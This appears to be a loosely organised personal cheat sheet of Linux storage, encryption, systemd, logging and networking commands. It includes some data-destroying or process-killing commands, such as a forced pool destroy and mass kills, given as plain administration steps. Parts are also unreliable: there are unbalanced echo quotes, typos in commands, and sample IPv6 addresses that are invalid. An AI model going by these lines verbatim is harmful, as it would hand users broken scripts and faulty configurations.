btrfs inspect-internal tree-stats




--check-data-csum

--progress 

--subvol-extents <subvolid>			show extent state for the given subvolume


btrfs rescue super-recover -v 




filesystem sync



btrfs subvolume create /home

btrfs subvolume snapshot /home/ /home-snap

btrfs subvolume delete /home-snap/


btrfs subvolume list /mnt/btrfs

e2fsck -D /dev/sda1





echo "## ------------------------------------------------------------------------ ##"
echo "   [?] By removing the subvolume named like ext2_saved or reiserfs_saved		"
echo "          all metadata of the original filesystem will be removed:			"
echo "## ------------------------------------------------------------------------ ##"
btrfs subvolume delete /mnt/ext2_saved




echo "##-========================================================-##"
echo "   [+] run defragmentation on the entire filesystem. 			"
echo "##-========================================================-##"

echo "## ---------------------------------------------------------------- ##"
echo "   [?] This will attempt to make file extents more contiguous.		"
echo "## ---------------------------------------------------------------- ##"


btrfs filesystem defrag -v -r -f -t 32M /mnt/btrfs

echo "## --------------------------------------------------------- ##"
echo "   [?] Verbose recursive defragmentation (-v, -r)				"
echo "   [?] flush data per-file (-f) 								"
echo "   [?] with target extent size 32MiB (-t)						"
echo "## --------------------------------------------------------- ##"






echo "##-================================================================================-##"
echo "   [+] defragment a file system or individual files and directories.					"
echo "##-================================================================================-##"
btrfs filesystem defragment /home
btrfs filesystem defragment /usr/local/ISOs/*.iso






## ================================================================================================= ##


echo "##-====================================================================-##"
echo "   [?] The metadata block groups after conversion may 			"
echo "       be smaller than the default size (256MiB or 1GiB)..		"
echo "   [?] Running a balance will attempt to merge the block groups.	"
echo "##-====================================================================-##"
btrfs balance start -m /mnt/btrfs




ls -l /dev/btrfs-control
/sys/fs/btrfs/features
mknod --mode=600 c 10 234 /dev/btrfs-control	





btrfs inspect-internal dump-super device	
btrfstune










ZFS: zpool and zfs

• Hybrid volume/filesystem management with RAID capabilities
• Compression/deduplication of data
• Data snapshots
• Volume provisioning (zvols)
• Ability to use different devices for caching and logging
• Ability to use delegate administrative rights to unprivileged users


ZFS works In transactions In where the ueberblock is only updated if everything was completed.

Copies of previous uberblocks (128) are being
kept In a round robin fashion.

The so called vdev labels, which identify the disks used In a zfs pool, also
have multiple copies: 
> 2 at the beginning of the disk
        &
> 2 at the end."


echo "##-======================================================================-##"
echo "[+] The pools can have seperate cache and logging devices attached 		  "
echo "##-======================================================================-##"
echo "## ---------------------------------------------------------------------- ##"
echo "        (so that reading/writing is offloaded to faster devices) 			  "
echo "   Having multiple disks In a pool allows for on the fly data recovery.	  "
echo "## ---------------------------------------------------------------------- ##"
echo "##-======================================================================-##"



echo "##-=================================================-##"
echo -e "\t\t [+] History overview for ZFS pools:				 "
echo "##-=================================================-##"
sudo zpool history


/usr/share/doc/zfsutils-linux/examples
/usr/share/doc/zfsutils-linux/examples/vdev_id.conf.alias.example
/usr/share/doc/zfsutils-linux/examples/vdev_id.conf.multipath.example
/usr/share/doc/zfsutils-linux/examples/vdev_id.conf.sas_direct.example
/usr/share/doc/zfsutils-linux/examples/vdev_id.conf.sas_switch.example

/usr/lib/x86_64-linux-gnu/zfs/zed.d/all-debug.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/all-syslog.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/checksum-notify.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/checksum-spare.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/data-notify.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/generic-notify.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/io-notify.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/io-spare.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/resilver.finish-notify.sh
/usr/lib/x86_64-linux-gnu/zfs/zed.d/scrub.finish-notify.sh


/lib/udev/rules.d/90-zfs.rules

/lib/modules-load.d/zfs.conf
/lib/systemd/system/zfs-import-cache.service
/lib/systemd/system/zfs-import-scan.service
/lib/systemd/system/zfs-mount.service
/lib/systemd/system/zfs-share.service
/lib/systemd/system/zfs-zed.service
/lib/systemd/system/zfs.target
/lib/systemd/system-preset/50-zfs.preset

/etc/cron.d/zfsutils-linux
/etc/default/zfs
/etc/sudoers.d/zfs
/etc/systemd/system/zfs-mount.service.wants
/etc/systemd/system/zfs-share.service.wants
/etc/systemd/system/zfs.target.wants
/etc/systemd/system/multi-user.target.wants/zfs.target
/etc/systemd/system/zfs-mount.service.wants/zfs-import-cache.service
/etc/systemd/system/zfs-share.service.wants/zfs-mount.service
/etc/systemd/system/zfs.target.wants/zfs-import-cache.service
/etc/systemd/system/zfs.target.wants/zfs-mount.service
/etc/systemd/system/zfs.target.wants/zfs-share.service
/etc/systemd/system/zfs.target.wants/zfs-zed.service
/etc/zfs/zed.d
/etc/zfs/zfs-functions
/etc/zfs/zed.d/all-syslog.sh
/etc/zfs/zed.d/checksum-notify.sh
/etc/zfs/zed.d/checksum-spare.sh
/etc/zfs/zed.d/data-notify.sh
/etc/zfs/zed.d/io-notify.sh
/etc/zfs/zed.d/io-spare.sh
/etc/zfs/zed.d/resilver.finish-notify.sh
/etc/zfs/zed.d/scrub.finish-notify.sh
/etc/zfs/zed.d/zed-functions.sh
/etc/zfs/zed.d/zed.rc


/usr/share/zfs/zpool-create.sh
/usr/share/zfs/zfs.sh




zfs  command  configures  ZFS datasets within a ZFS storage pool

 A dataset is identified by a unique path within the ZFS namespace

ZFS file systems are  designed  to be  POSIX  compliant







zfs list

zpool status zpool


update-initramfs -u





echo "##-====================================-##"
echo -e "\t\t [+] ZFS Pool Listing:				"
echo "##-====================================-##"
sudo zpool list -v


echo "##-====================================-##"
echo -e "\t [+] Status of the pool:				"
echo "##-====================================-##"
sudo zpool status -v



echo "##-==================================================-##"
echo -e "\t [+] List the full set of ZFS Attributes:"
echo "##-==================================================-##"
zfs get all



echo "##-====================================-##"
echo -e "\t [+] ZFS filesystem listing:			"
echo "##-====================================-##"
sudo zfs list


echo "##-===================================================================-##"
echo -e "\t [+] Create a ZFS filesystem “documents” and use compression"
echo "##-===================================================================-##"
sudo zfs create -o compression=on tank/documents
sudo zfs list tank/documents




echo "##-====================================================-##"
echo -e "\t\t [+] View the compression ratio					" 
echo -e "\t\t (once some data has been written)					"
echo "##-====================================================-##"
sudo zfs get compressratio tank/documents




echo "##-====================================================================-##"
echo "[?] Creating a backup of /tank/documents (done instantaniously):
echo "##-====================================================================-##"
echo "## -------------------------------------------------------------------- ##"
echo "       it wont take up space until /tank/documents’s content" changes.
echo "## -------------------------------------------------------------------- ##"
echo "       The contents of the snapshot can be accessed through the
echo "         '.zfs/snapshot' directory of that ZFS filesystem."
echo "## -------------------------------------------------------------------- ##"
echo "##-====================================================================-##"

sudo zfs snap tank/documents@backup
sudo zfs list -t snapshot




An  incremental  send  stream  from  snapshot A to snapshot B contains information
about every block that changed between A  and  B.  Blocks  which  did  not  change
between  those  snapshots  can  be  identified and omitted from the stream using a
piece of metadata called the 'block birth time'





lz4 is a high-performance real-time compression algorithm that  features  signifi‐
cantly  faster compression and decompression as well as a higher compression ratio
than the older lzjb compression.

Typically, lz4 compression is approximately  50%
faster  on  compressible data and 200% faster on incompressible data than lzjb. It
is also approximately 80% faster on decompression, while giving approximately  10%
better compression ratio.

all newly written  metadata  will  be  compressed with lz4 algorithm.





view all events created since the loading of the ZFS infrastructure
zpool events

get a short list, and

       zpool events -v




smbios --type 1 --get-uuid 8 --set uuid
smbios --type 1 --get-string 7 --set serial



zpool offline

zpool scrub

zpool status 






echo "##-===================================================-##"
echo -e "\t [+] Adding a Mirror to a ZFS Storage Pool:"
echo "##-===================================================-##"

zpool add tank mirror sda sdb




echo "##-===================================================-##"
echo -e "\t [+] Listing Available ZFS Storage Pools				"
echo "##-===================================================-##"
zpool list



echo "##-=========================================================================-##"
echo -e "\t\t [+] Exporting a ZFS Storage Pool				"
echo "## ------------------------------------------------------------------------- ##"
echo "    [?] This exports the devices inside the pool tank, 								"
echo "    [?] wwhich later can be imported.		 									"
echo "## ------------------------------------------------------------------------- ##"
echo "##-=========================================================================-##"
zpool export tank




echo "##-============================================-##"
echo "\t\t [+] Importing a ZFS Storage Pool				"
echo "##-============================================-##"
zpool import

zpool import tank





echo "##-====================================================================-##"
echo -e "\t [+] Upgrades all ZFS Storage pools To the current version"
echo "##-====================================================================-##"
zpool upgrade -a



echo "##-============================================-##"
echo "\t\t [+] Destroy a ZFS Storage Pool:"
echo "##-============================================-##"
zpool destroy -f tank


echo "##-========================================================================================-##"
echo -e "\t\t [+] Create a new pool with an available hot spare:"
echo "##-========================================================================================-##"
echo "##------------------------------------------------------------------------------------------##"
echo " [?] (If one of the disks were to fail, The pool would be reduced to the degraded state.)" 
echo "##------------------------------------------------------------------------------------------##"
echo "##-========================================================================================-##"
zpool create tank mirror sda sdb spare sdc



echo "##-=========================================================================-##"
echo -e "\t [?] The failed device can be replaced using the following command:"
echo "##-=========================================================================-##"
zpool replace tank sda sdd





echo "##-==========================================-##"
echo      [+] List All the bookmarks inside the pool 	"
echo "##-==========================================-##"
zfs list -t bookmark -r poolname








echo "##-===========================================================-##"
echo "   You have ReiserFS on /dev/hda1, and you wish to have "
echo "   it working  with  its  journal  on  the device /dev/journal"
echo "##-===========================================================-##"


echo "##-======================================================================-##"
echo "   boot kernel patched with special relocatable journal support patch"
echo "##-======================================================================-##"

reiserfstune /dev/hda1 --journal-new-device /dev/journal -f

mount /dev/hda1 

echo "##-==============================================-##"
echo "    Change max transaction size to 512 blocks"
echo "##-==============================================-##"
reiserfstune -t 512 /dev/hda1

echo "##-=========================================================================================-##"
echo "Use your file system on another kernel that doesnt contain relocatable journal support."
echo "##-=========================================================================================-##"
umount /dev/hda1


reiserfstune /dev/hda1 -j /dev/journal --journal-new-device /dev/hda1 --make-journal-standard


mount /dev/hda1 and use.


echo "##-==============================================================================-##"
echo "   Configure ReiserFS on /dev/hda1 and to be able to switch between different "
echo "   journals including journal located on the device containing the filesystem."
echo "##-==============================================================================-##"
echo "   boot kernel patched with special relocatable journal support patch"
echo "##-==============================================================================-##"
mkreiserfs /dev/hda1

echo "##-=========================================================================================-##"
echo "   you got solid state disk (perhaps /dev/sda, they typically look like scsi disks)"
echo "##-=========================================================================================-##"
reiserfstune --journal-new-device /dev/sda1 -f /dev/hda1


echo "##-===========================================================================-##"
echo "   If your scsi device dies, and you have an extra IDE device try this:"
echo "##-===========================================================================-##"
reiserfsck --no-journal-available /dev/hda1

or

reiserfsck --rebuild-tree --no-journal-available /dev/hda1

reiserfstune --no-journal-available --journal-new-device /dev/hda1 /dev/hda1




debugreiserfs


- J Displays the journal header, which includes assorted filesystem
details.


gunzip -c xxx.gz | debugreiserfs -u /dev/image


-d     prints the formatted nodes of the internal tree of the filesystem.

       -D     prints the formatted nodes of all used blocks of the filesystem.

       -m     prints the contents of the bitmap (slightly useful).

       -o     prints the objectid map (slightly useful).



extracts  the  filesystem's metadata
debugreiserfs -p /dev/xxx | gzip -c > xxx.gz


builds the ReiserFS filesystem image
gunzip -c xxx.gz | debugreiserfs -u /dev/image


Creates a file with a list of the blocks that are flagged as being bad In the filesystem.
debugreiserfs -B file 

Get the file system's block size:

# debugreiserfs /dev/hda3 | grep '^Blocksize'

Calculate the block number:

# echo "(58656333-54781650)*512/4096" | bc -l

# get more info about this block 
debugreiserfs -1 484335 /dev/hda3








echo "##-========================================================================================-##"
echo "## ---------------------------------------------------------------------------------------- ##"
echo -e "\t\t [+] Self-Monitoring, Analysis and Reporting Technology System (SMART)					"
echo "## ---------------------------------------------------------------------------------------- ##"
echo "##-========================================================================================-##"




echo "##-============================================================================-##"
echo "   [?] A device doesnt need to be mounted to obtain its smart information. 		"
echo "       It only needs to be attached to the system.								"
echo "##-============================================================================-##"


smartd can be configured at start-up using the configuration file 
/usr/local/etc/smartd.conf


/etc/smartd.conf

/etc/smartmontools/smartd.conf

/var/log/smartd.log
/var/log/messages
/var/log/syslog


## start automatic monitoring of your disks with the smartd daemon:
smartd -d

## start the daemon in foreground (debug) mode:
smartd



smartctl -l selftest /dev/hda




## ------------------------------------------------------------------------------------------------- ##
smartctl -a /dev/sda 			## Print SMART information for drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
smartctl -s off /dev/sda		## Disable SMART monitoring and log collection for drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
smartctl -t long /dev/sda		## Begin an extended SMART self-test on drive /dev/sda
## ------------------------------------------------------------------------------------------------- ##
smartctl -H /dev/sda			## Overall health report on the device
## ------------------------------------------------------------------------------------------------- ##
smartctl -i /dev/sda			## details on a specific device
## ------------------------------------------------------------------------------------------------- ##
smartctl --scan
## ------------------------------------------------------------------------------------------------- ##
smartctl -x	/dev/sda	## smartctl --xall
## ------------------------------------------------------------------------------------------------- ##
smartctl -c	/dev/sda	## smartctl --capabilities
## ------------------------------------------------------------------------------------------------- ##
smartctl -A /dev/sda		## smartctl --attributes 
## ------------------------------------------------------------------------------------------------- ##

other signs that there is a bad sector on the disk can be found in the non-zero value of the Current Pending Sector count:





tune2fs -l /dev/hda3 | grep Block		## find the block size of the file system (normally 4096 bytes for ext2):

## Checking for S.M.A.R.T. capability ---"
DISKTYPE="$(smartctl --scan | grep "${DEVICE}" | cut -d' ' -f3)"



echo "##-===============================================-##"
echo -e "\t\t [+] Set Up S.M.A.R.T. Disk Controls:"
echo "##-===============================================-##"
smartctl -s on -d "${DISKTYPE}" "${DEVICE}"



update-smart-drivedb
smartd

smartctl -a /dev/sda


smartctl -P showall



smartctl -P showall ´MODEL´			##  lists all entries matching MODEL
             



smartctl -l error <device>			## View Devices error logs


-H				--health
--attributes
--capabilities



smartctl --scan 
-d TYPE

/var/lib/smartmontools/smartd.VENDOR-MODEL-SERIAL.scsi.state
/var/lib/smartmontools/smartd.MODEL-SERIAL.ata.state




echo "##-=======================================-##"
echo -e "\t\t [+] :"
echo "##-=======================================-##"



echo "##-=========================================================================-##"

echo "##-=========================================================================-##"





echo "##-===========================================================-##"
echo -e "\t\t [+] query the current state of the display:"
echo "##-===========================================================-##"
$ xdpyinfo | awk '/dimensions:/ {print $2}'
$ xrandr -q


 | xsel

echo "##-===================================================================-##"
echo -e "\t [+] copy command-line output to the standard X clipboards"
echo "##-===================================================================-##"
$ awk '{print $1}' names.txt | xsel
$ awk '{print $1}' names.txt | xsel --clipboard









## ------------------------------------------------------------------------------------------------- ##
	• if= 		## Provides the input (or device) that will be used to create the initial file
## ------------------------------------------------------------------------------------------------- ##
	• of=  		## The file to be created, full path and name
## ------------------------------------------------------------------------------------------------- ##
	• bs=  		## Block size
## ------------------------------------------------------------------------------------------------- ##
	• count= 	## The size, In MB (default), of the file
## ------------------------------------------------------------------------------------------------- ##






dd if=/dev/zero of=/opt/swap/swap_file bs=1M count=1024 		## 



back up your [Master Boot Record]
dd if=/dev/sda of=sda.mbr bs=512 count=1





















echo $(tty)			## Print your terminal device (e.g. /dev/tty1, /dev/pts/1)

stty Change or display terminal line settings




usermo d -a -G wheel username

## /etc/pam.d/su

#auth			required		pam_wheel.so use_uid




sudo -l 		## List the allowed commands for the current user

sudo !! 		## Run again the last command, but this time as root

su -
su -l Ensure that the spawned shell is a login shell - setting the correct environment variables.



sudo -e /etc/passwd			## Edit a protected file
sudoedit /etc/passwd

visudo Edit /etc/sudoers

gksu -u root -l
gksudo -u root $cmd


## ------------------------------------------------------------- ##
## use the pam_tty_audit module to enable TTY auditing 
## for specified users by adding the following line to your 
## ------------------------------------------------------------- ##
## /etc/pam.d/system-auth
## ------------------------------------------------------------- ##

session required pam_tty_audit.so disable=pattern enable=pattern


## ------------------------------------------------------------------------------------------------- ##
## where pattern represents a comma-separated listing of users with an optional use of globs. 
## For example, the following configuration will enable TTY auditing 
## for the root user and disable it for all other users:
## ------------------------------------------------------------------------------------------------- ##

session required pam_tty_audit.so disable=* enable=root










dm-crypt encrypted filesystems use Device Mapper


This allows plaintext to be used by applications
while any writes to the volume are encrypted.

Dont use the dm-crypt type
It uses an unsalted passphrase hash for its single keys
And it maintains no metadata on the volume








eCryptfs metadata is stored In each files header




eCrypt is a pseduo filesystem because it layers itself on top of the current filesystem






echo "##-====================================================================-##"
echo "   [+] Attach the partition to the Linux Virtual Directory Structure:		"
echo "##-====================================================================-##"
mount -t ext4 /dev/sdd1 /home


echo "##-================================================-##"
echo "   [+] Layer the eCrypt filesystem on top of it		"
echo "##-================================================-##"
mount -t eCryptfs /home /home



You can add additional mount options with eCrypt:

  • Key byte size
  • cipher choice
  • file name encryption




mount -t ecryptfs /home/johndoe/Secret /home/johndoe/Secret
mount | grep /home/johndoe/Secret

umount /home/johndoe/Secret








Linux Unified Key Setup (LUKS) - An improved dm-crypt encrypted filesystem type

   [?] LUKS implements cryptsetup utility using the Device Mapper
    

LUKS uses a Master Key and multiple User Keys.

 • it maintains the metadata on the volume
 • And provides improved anti-forensic features












LUKS (Linux Unified Key Setup) is now the preferred way to set up disk
encryption with dm-crypt using the 'cryptsetup' utility, see
https://gitlab.com/cryptsetup/cryptsetup

[[
#!/bin/sh
# Create a crypt device using dmsetup
dmsetup create crypt1 --table "0 `blockdev --getsz $1` crypt aes-cbc-essiv:sha256 babebabebabebabebabebabebabebabe 0 $1 0"
]]

[[
#!/bin/sh
# Create a crypt device using dmsetup when encryption key is stored In keyring service
dmsetup create crypt2 --table "0 `blockdev --getsize $1` crypt aes-cbc-essiv:sha256 :32:logon:my_prefix:my_key 0 $1 0"
]]

[[
#!/bin/sh
# Create a crypt device using cryptsetup and LUKS header with default cipher
cryptsetup luksFormat $1
cryptsetup luksOpen $1 crypt1





cloud-init-local.service
dracut-mount.service








RAID (Redundant Array of Independent Disks)


Hardware RAID - controlled by a hardware controller (an add In card or special implementation on the motherboard)
(SCSI generally)

Software RAID - Your kernel will control the RAID.


(The LPIC-2 exam focuses on RAID 0,1, and 5)



#############################################################################################
{!} RAID Levels: 	   <|> Description														|
#############################################################################################
| <•> RAID 0			| • stripping data across disks. 									|
|						| • There is no redundancy or fault tolerance 						|
|						| • The advantage is that performance is increased as a result		|
|						|	of multiple reads and writes.									| 
#############################################################################################
| <•> RAID 1			| • mirroring of data without stripping or parity computation. 		|
| 						| • There is a minimum of two drives								|
| 						| • if one fails, you can still access your data					|
#############################################################################################
| <•> RAID 5		 	| •	block-level stripping											|
| 						| • distributed parity. 											|
| 						| • Parity is distributed among drives. 							|
| 						| • Requires a minimum of 3 disks.						|
| 						| • Loss of a drive results In degraded performance. 				|				 
#############################################################################################
| <•> RAID 6		 	| •	block-level stripping with double distributed parity. This 		|
| 						|	strategy allows both drives to fail. 							|	
| 						| 							 										| 
|						|																	|
#############################################################################################
| <•> RAID 1+0		 	| •	mirroring first and then stripping. This level requires a 		|
|						|	minimum of four disks. 							 				|
| 						| 																 	| 
|						|																	|
#############################################################################################
| <•> RAID 0+1		 	| •	stripping and then mirroring. This level requires a minimum of 	|
| 						|	our drives. When troubleshooting hardware disk issues, you 		|
|						|	should know which RAID level is being used, if at all. The		|						
| 						| 							 										| 
|						|																	|
#############################################################################################



MTBF - Mean Time Between Failure




RAID 5
 •	All the drives In the array will be user with parity data spread throughout all disks
 In a round ribin approach. (fire disk A, then disk B, then disk C)

Parity Data - data derived from all the devices. It can be used to rebuild any of the active devices In the 
storage pool In the event of failure.





##-------------------------------------------------------------------------------------##
	mdadm --misc -Q /dev/sdd1 		## Display information about a device
##-------------------------------------------------------------------------------------##
	mdadm --misc -D /dev/md0 		## Display detailed information about the RAID array
##-------------------------------------------------------------------------------------##
	mdadm --misc -o /dev/md0 		## Mark the RAID array as readonly
##-------------------------------------------------------------------------------------##
	mdadm --misc -w /dev/md0 		## Mark the RAID array as read & write
##-------------------------------------------------------------------------------------##




echo "##-=========================================================-##"
echo "   [+] Display information about RAID arrays and devices:		 "
echo "##-=========================================================-##"
cat /proc/mdstat




• n			# Create new partition

• p			# Define it as primary (vs. extended) - NOTE: best for Software RAID

• e			# Define it as extended (vs. primary)

• #			# The number of the primary or extended partition to define








export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8




cp /usr/share/zoneinfo/GMT /etc/localtime



ln -sf /usr/share/zoneinfo/UTC /etc/localtime 				## for Universal Coordinated Time 
ln -sf /usr/share/zoneinfo/EST /etc/localtime				## for Eastern Standard Time 
ln -sf /usr/share/zoneinfo/US/Central /etc/localtime 		## for American Central time (including DST)
ln -sf /usr/share/zoneinfo/US/Eastern /etc/localtime 		## for American Eastern (including DST)

timedatectl list-timezones									## list the available timezones
timedatectl set-timezone America/Chicago					## set your specific timezone

export TZ=:/usr/share/zoneinfo/US/Mountain					## export the timezone env variable


dpkg-reconfigure tzdata										## Reconfigure the timezone configuration



systemctl list-dependencies rsyslog.service


systemctl status *.service
systemctl show-environment
systemctl show
systemd-analyze time


systemctl status NetworkManger.service
systemctl daemon-reload NetworkManager.service
systemctl start --now NetworkManager.service
systemctl start NetworkManager.service
systemctl status NetworkManager.service

systemctl stop NetworkManager.service
systemctl disable NetworkManager.service



dbus-org.freedesktop.nm-dispatcher.service



systemd-rfkill.service


systemd-fstab-generatorwqq

echo "##-====================================-##"
echo "   [+] See all local configurations:		"
echo "##-====================================-##"
systemd-delta


echo "##-========================================-##"
echo "   [+] To see all runtime configurations:		"
echo "##-========================================-##"
systemd-delta /run


echo "##-==================================================-##"
echo "   [+] See all system unit configuration changes:		"
echo "##-==================================================-##"
systemd-delta systemd/system



echo "##-=======================================================-##"
echo "   [+] See all runtime dropin changes for system units:		"
echo "##-=======================================================-##"
systemd-delta --type=extended /run/systemd/system



/lib/systemd/system/postgresql@.service
/lib/systemd/system/postgresql@.service.d/parrot_postgresql.conf 	
/lib/systemd/system/rc-local.service
/lib/systemd/system/rc-local.service.d/debian.conf
/lib/systemd/system/systemd-resolved.service
/lib/systemd/system/systemd-resolved.service.d/resolvconf.conf




service networking stop
killall -e nm-applet



service networking start
service --status-all
service network-manager start
systemctl status NetworkManger.service

NetworkManager-wait-online.service
NetworkManager.service
networking.service

netfilter-persistent.service



ModemManager.service
/lib/systemd/system/ModemManager.service


mysql.service


dev-dvd.device
dev-dvdrw.device
dev-sr0.device

dev-sda.device
dev-sda1.device
dev-ttyS0.device

dev-ttyS1.device
dev-ttyS2.device


sys-devices-pci0000:00-0000:00:15.0-0000:03:00.0-net-eth0.device
/sys/devices/pci0000:00/0000:00:15.0/0000:03:00.0/net/eth0

sys-subsystem-net-devices-eth0.device
/sys/devices/pci0000:00/0000:00:15.0/0000:03:00.0/net/eth0

sys-kernel-config.mount
sys-kernel-debug-tracing.mount
sys-kernel-debug.mount

var-lib-lxcfs.mount
lxc-net.service
/lib/systemd/system/lxc-net.service
lxc.service
/lib/systemd/system/lxc.service
lxcfs.service
/lib/systemd/system/lxcfs.service



systemctl list-unit-files



apparmor.service
/lib/systemd/system/apparmor.service

auditd.service
/lib/systemd/system/auditd.service

firewalld.service
/lib/systemd/system/firewalld.service




dm-event.service
/lib/systemd/system/dm-event.service




icinga2.service
/lib/systemd/system/icinga2.service


mariadb.service
/lib/systemd/system/mariadb.service

pcscd.service
/lib/systemd/system/pcscd.service


phpsessionclean.service
/lib/systemd/system/phpsessionclean.service
/usr/lib/php/sessionclean


pppd-dns.service
/lib/systemd/system/pppd-dns.service




rsyslog.service


rsync.service
/lib/systemd/system/rsync.service









KERNEL=="fd[0-9]*", OWNER="jdoe" 				## Match all floppy disk drives; give ownership of the device file to user jdoe















































cat /var/lib/logrotate/status		## Default logrotate state file


/etc/logrotate.conf					## logrotate Configuration file location




rotated whenever it grows over 100k in size


       compress

       /var/log/messages {
           rotate 5
           weekly
           postrotate
               /usr/bin/killall -HUP syslogd
           endscript
       }

       "/var/log/httpd/access.log" /var/log/httpd/error.log {
           rotate 5
           mail www@my.org
           size 100k
           sharedscripts
           postrotate
               /usr/bin/killall -HUP httpd
           endscript
       }




Immediately after rotation (before the postrotate script is run) the log file is created


create mode owner group, 


create owner group


					## ----------------------------------------- ##
daily  				## 		Log files are rotated every day.
					## ----------------------------------------- ##


weekly 				## Log files are rotated 





					## ----------------------------------------- ##
dateext				## 		Archive old versions of log files 
					## 	  adding a date extension like YYYYMMDD
					## ----------------------------------------- ##


echo "##-================================-##"
echo "   [?] the date ext options are:  	"
echo "##-================================-##"
		  %Y  %m  %d  %H %M %S %V and %s




echo "##-============================-##"
echo "   [?] The default date ext is: 	"
echo "##-============================-##"
					-%Y%m%d

echo "##-============================-##"
echo "   [?] The hourly date ext is: 	"
echo "##-============================-##"
					-%Y%m%d%H 					## (which is the default value.)


				##-=====================================-##
hourly			## Log  files  are rotated every hour
				##-=====================================-##

				##-=====================================================================-##
maxsize 		## [?] Log files are rotated when they grow bigger than size bytes
				##-=====================================================================-##

				##-=====================================================================-##
minsize   		## [?] Log  files  are  rotated when they grow bigger than size bytes, 
				##     but not before the additionally specified time interval
				## --------------------------------------------------------------------- ##
             	##      		(daily, weekly, monthly, or yearly).
				## --------------------------------------------------------------------- ##
				##-=====================================================================-##



su user group
Rotate log files set under this user and group




renamecopy
              Log  file  is renamed to temporary filename in the same directory by adding ".tmp" extension


copy   Make a copy of the log file, but don't change the original at all.










rsync --verbose --perms --recursive --checksum "$WHONIX_SOURCE_FOLDER"/whonix_workstation/ "$CHROOT_FOLDER"/

rsync --verbose --perms --recursive --checksum "$WHONIX_SOURCE_FOLDER"/whonix_gateway/ "$CHROOT_FOLDER"/
rsync --verbose --perms --recursive --checksum "$WHONIX_SOURCE_FOLDER"/whonix_shared/ "$CHROOT_FOLDER"/












rsync -avz /home root@10.0.0.7:/backup/ 

Synchronize the content of the home directory with the backup directory
on the remote server, using SSH. 

Rsyncs archive mode invokes the following: 

 • operates recursively 

Rsync defaultly preserves the following: 
 • owner
 • group
 • permissions
 • timestamps
 • symlinks





echo "##-========================================================================================-##"
echo "   [+] Synchronize the content of the home directory with the temporary backup directory.
echo "##------------------------------------------------------------------------------------------##"
echo "   [?] Use recursion, compression, and verbosity.
echo "##-========================================================================================-##"

rsync -rzv /home /tmp/bak
rsync -rzv /home/ /tmp/bak/home 





## ------------------------------------------------------------------------------------------------- ##
	fuser						## Used to identify processes that are using files or sockets
## ------------------------------------------------------------------------------------------------- ##
	fuser /mnt/data				## 
## ------------------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------------------------- ##
	fuser -k /mnt/data			## Kill any processes accessing the file or mount
## ------------------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------------------------- ##
	kill `lsof -t /home`		## Kill all processes that have files open under /home.
## ------------------------------------------------------------------------------------------------- ##
	kill %1						## kill the previous command that was put In the background
## ------------------------------------------------------------------------------------------------- ##









echo "## ============================================================ ##"
echo "   [+] kill all sshd processes whose parent process ID is 1		"
echo "## ============================================================ ##"

## ------------------------------------------------------------------------------------------------------------------- ##
	pkill -P 1 sshd		# kills only the master sshd process leaving all of the users on the system still logged in.
## ------------------------------------------------------------------------------------------------------------------- ##











echo "## ============================================ ##"
echo "   [+] find process associated with a port:		"
echo "## ============================================ ##"
fuser [portnumber]/[proto]



echo "   [+] Kill all processes that have files open under /home."

kill `lsof -t /home`		



kill the previous command that was put In the background

kill %1


fuser -k /mnt/data			## Kill any processes accessing the file or mount






network layer controls how data is sent between connected network devices,
both in your local network and across the Internet.


Novell used the IPX/SPX protocol










The IPv6 networking scheme uses 128-bit addresses
The IPv4 networking scheme uses 32-bit addresses


dotted-decimal notation - IP addresses split into four 8-bit values


IP addresses are split into two sections

network address
host address.


192.168.1.67
\_______/\_/
 Network Host

IPv6 also provides for two different types of host addresses:
Link local addresses
Global addresses

split into eight groups of four hexadecimal digits separated by colons,
such as this:
fed1:0000:0000:08d3:1319:8a2e:0370:7334

The IPv6 software on a host device automatically assigns the link local address.

The Link Local Address 
Uses a default network address of fe80:: ; 
then it derives the host part of the address from the media access control (MAC) address


The IPv6 global address
each network is assigned a unique network address, and each host on the
network must have a unique host address.




Classless Inter-Domain Routing (CIDR) notation. CIDR notation represents
the netmask as just the number of masked bits in the IP address.

the network 192.168.1.0 and netmask 255.255.255.0
would have the CIDR notation of 192.168.1.0/24.



TABLE 6.2 Linux network configuration files

Debian-based 	/etc/network/interfaces 
Red Hat–based 	/etc/sysconfig/network-scripts/
OpenSUSE		/etc/sysconfig/network




Sample CentOS ifcfg-eth0 file configuration settings
DEVICE="eth0"
NM_CONTROLLED="no"
ONBOOT=yes
TYPE=Ethernet
BOOTPROTO=static
NAME="System eth0"
IPADDR=192.168.1.77
NETMASK=255.255.255.0NETMASK=255.255.255.0
IPV6INIT=yes
IPV6ADDR=2003:aef0::23d1::0a10:00a1/64



The second file required on Red Hat–based systems is the network file, which
defines the hostname and default gateway
Sample CentOS network file configuration settings

NETWORKING=yes
HOSTNAME=mysystem
GATEWAY=192.168.1.254
IPV6FORWARDING=yes
IPV6_AUTOCONF=no
IPV6_AUTOTUNNEL=no
IPV6_DEFAULTGW=2003:aef0::23d1::0a10:0001
IPV6_DEFAULTDEV=eth0

features
commands
list
event 
-t - print timestamp
		-r - print relative timstamp
		-f - print full frame for auth/assoc etc.
iw dev wlan0 link
iw dev wlan0 scan
iw dev wlan0 connect "Access Point"
iw dev wlan0 connect "Access Point"
iw dev wlan0 connect "Access Point"
iw dev wlan0 
iw dev wlan0 
iw dev wlan0 
iw dev wlan0 
iw dev wlan0 set txpower fixed 25
iw dev wlan0 
txpower 
iw dev wlan0 scan dump
iw dev wlan0 survey dump
iw dev wlan0 station get 
iw dev wlan0 station dump 
iw dev wlan0 info
iw dev wlan0 mpath dump
set netns { <pid> | name <nsname> }

iwlist wlan0 scan


iwconfig eth0 txpower 25
iwconfig eth0 txpower fixed
iwconfig eth0 nickname "My Linux Node"
iwconfig eth0 nwid off
iwconfig eth0 essid ""
--ap 
iwconfig eth0 ap 
iwconfig eth0 key s:password
--freq
iwconfig eth0 freq 
